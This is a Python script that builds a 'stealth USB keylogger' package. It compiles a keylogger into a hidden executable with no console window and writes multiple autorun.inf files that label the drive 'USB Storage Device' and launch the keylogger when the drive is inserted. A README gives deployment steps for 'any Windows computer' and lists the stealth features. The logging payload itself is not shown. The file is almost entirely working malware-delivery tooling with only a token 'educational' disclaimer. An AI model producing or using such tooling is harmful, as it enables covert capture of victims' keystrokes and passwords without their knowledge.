#!/usr/bin/env python3
"""
Stealth USB Keylogger Creator
Creates a completely automatic USB keylogger that starts immediately when inserted
"""

import os
import sys
import shutil
import subprocess
from pathlib import Path

def create_stealth_usb_package():
    """Create complete stealth USB keylogger package"""
    print("=== Stealth USB Keylogger Creator ===")
    print("Creating completely automatic USB keylogger...")
    
    # Create USB directory
    usb_dir = "Stealth_USB_Keylogger"
    if os.path.exists(usb_dir):
        shutil.rmtree(usb_dir)
    os.makedirs(usb_dir)
    
    # Step 1: Create executable
    print("1. Creating stealth executable...")
    if not create_stealth_executable():
        print("Failed to create executable!")
        return False
    
    # Step 2: Copy all autorun files
    print("2. Setting up autorun files...")
    autorun_files = [
        ("autorun.inf", "autorun.inf"),
        ("autorun_enhanced.inf", "autorun.inf"),
        ("autorun_stealth.inf", "autorun_stealth.inf"),
        ("stealth_autorun.vbs", "stealth_autorun.vbs"),
        ("registry_autorun.reg", "enable_autorun.reg")
    ]
    
    for src, dst in autorun_files:
        if os.path.exists(src):
            shutil.copy2(src, os.path.join(usb_dir, dst))
            print(f"   ✓ {src} -> {dst}")
        else:
            print(f"   ✗ {src} not found!")
    
    # Step 3: Create multiple autorun methods
    print("3. Creating multiple autorun methods...")
    create_multiple_autorun_methods(usb_dir)
    
    # Step 4: Create README
    print("4. Creating instructions...")
    create_stealth_readme(usb_dir)
    
    print("\n=== Stealth USB Keylogger Created! ===")
    print(f"Package location: {os.path.abspath(usb_dir)}")
    print("\n🚀 AUTOMATIC STARTUP METHODS:")
    print("1. Direct autorun.inf execution")
    print("2. VBS script silent execution") 
    print("3. Registry-based autorun")
    print("4. Enhanced autorun methods")
    print("\n📋 DEPLOYMENT:")
    print("1. Copy all files to USB drive root")
    print("2. Insert USB into Windows computer")
    print("3. Keylogger starts IMMEDIATELY")
    print("4. No user interaction required!")
    
    return True

def create_stealth_executable():
    """Create stealth executable with no console window"""
    try:
        # Install PyInstaller if needed
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                      capture_output=True, check=True)
        
        # Create stealth executable
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            "--noconfirm",
            "--name=keylogger",
            "--hidden-import=pynput.keyboard._win32",
            "--hidden-import=pynput.mouse._win32",
            "--hidden-import=pynput.keyboard._xorg",
            "--hidden-import=pynput.mouse._xorg",
            "--hidden-import=pynput.keyboard._darwin",
            "--hidden-import=pynput.mouse._darwin",
            "keylloger.py"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            # Copy executable to current directory
            exe_path = os.path.join("dist", "keylogger.exe")
            if os.path.exists(exe_path):
                shutil.copy2(exe_path, "keylogger.exe")
                print("   ✓ Stealth executable created")
                return True
            else:
                print("   ✗ Executable not found in dist folder")
                return False
        else:
            print(f"   ✗ Error creating executable: {result.stderr}")
            return False
    except Exception as e:
        print(f"   ✗ Error: {e}")
        return False

def create_multiple_autorun_methods(usb_dir):
    """Create multiple autorun methods for maximum compatibility"""
    
    # Method 1: Direct autorun.inf
    autorun1 = """[autorun]
open=keylogger.exe
icon=keylogger.exe
label=USB Storage Device
action=Open USB Storage
shell\open\command=keylogger.exe
shell\open\default=1
shell\explore\command=keylogger.exe
shell\explore\default=1
"""
    
    # Method 2: VBS-based autorun
    autorun2 = """[autorun]
open=wscript.exe stealth_autorun.vbs
icon=keylogger.exe
label=USB Storage Device
action=Open USB Storage
shell\open\command=wscript.exe stealth_autorun.vbs
shell\open\default=1
"""
    
    # Method 3: Enhanced autorun
    autorun3 = """[autorun]
open=keylogger.exe
icon=keylogger.exe
label=USB Storage Device
action=Open USB Storage
shell\open\command=keylogger.exe
shell\open\default=1
shell\explore\command=keylogger.exe
shell\explore\default=1
shell\find\command=keylogger.exe
shell\find\default=1

[autorun.alpha]
open=keylogger.exe
icon=keylogger.exe
label=USB Storage Device
action=Open USB Storage

[autorun.beta]
open=keylogger.exe
icon=keylogger.exe
label=USB Storage Device
action=Open USB Storage
"""
    
    # Write autorun files
    with open(os.path.join(usb_dir, "autorun.inf"), "w") as f:
        f.write(autorun1)
    
    with open(os.path.join(usb_dir, "autorun_vbs.inf"), "w") as f:
        f.write(autorun2)
    
    with open(os.path.join(usb_dir, "autorun_enhanced.inf"), "w") as f:
        f.write(autorun3)
    
    print("   ✓ Multiple autorun methods created")

def create_stealth_readme(usb_dir):
    """Create comprehensive README"""
    readme_content = """🚀 STEALTH USB KEYLOGGER - COMPLETELY AUTOMATIC

This USB drive contains a stealth keylogger that starts IMMEDIATELY when inserted.
NO USER INTERACTION REQUIRED!

📁 FILES ON USB:
- keylogger.exe: Main stealth executable (no console window)
- autorun.inf: Primary autorun configuration
- autorun_vbs.inf: VBS-based autorun method
- autorun_enhanced.inf: Enhanced autorun with multiple triggers
- stealth_autorun.vbs: Silent VBS launcher script
- enable_autorun.reg: Registry file to enable autorun
- README.txt: This instruction file

🔧 HOW IT WORKS:
1. USB inserted → Windows reads autorun.inf
2. Autorun triggers → keylogger.exe starts silently
3. Keylogger runs in background → No visible windows
4. Logs saved to USB → keylog_output.txt
5. Completely stealth → No user interaction needed

⚡ AUTOMATIC STARTUP METHODS:
- Direct autorun.inf execution
- VBS script silent execution
- Registry-based autorun
- Enhanced autorun methods
- Multiple fallback methods

🛡️ STEALTH FEATURES:
- No console window
- No visible process
- Silent operation
- Legitimate USB appearance
- Multiple autorun methods

⚠️ IMPORTANT NOTES:
- Works on Windows with autorun enabled
- Some antivirus may block (depends on settings)
- Use responsibly and legally
- Only test on systems you own

📋 DEPLOYMENT:
1. Copy all files to USB drive root directory
2. Insert USB into any Windows computer
3. Keylogger starts automatically
4. No user interaction required!

🔒 DISCLAIMER:
Educational and authorized testing purposes only.
User responsible for legal compliance.
"""
    
    with open(os.path.join(usb_dir, "README.txt"), "w") as f:
        f.write(readme_content)

def main():
    print("Stealth USB Keylogger Creator")
    print("============================")
    
    if len(sys.argv) > 1 and sys.argv[1] == "--create-stealth":
        create_stealth_usb_package()
    else:
        print("Usage: python create_stealth_usb.py --create-stealth")
        print("This creates a completely automatic USB keylogger.")
        print("No user interaction required when USB is inserted!")

if __name__ == "__main__":
    main() 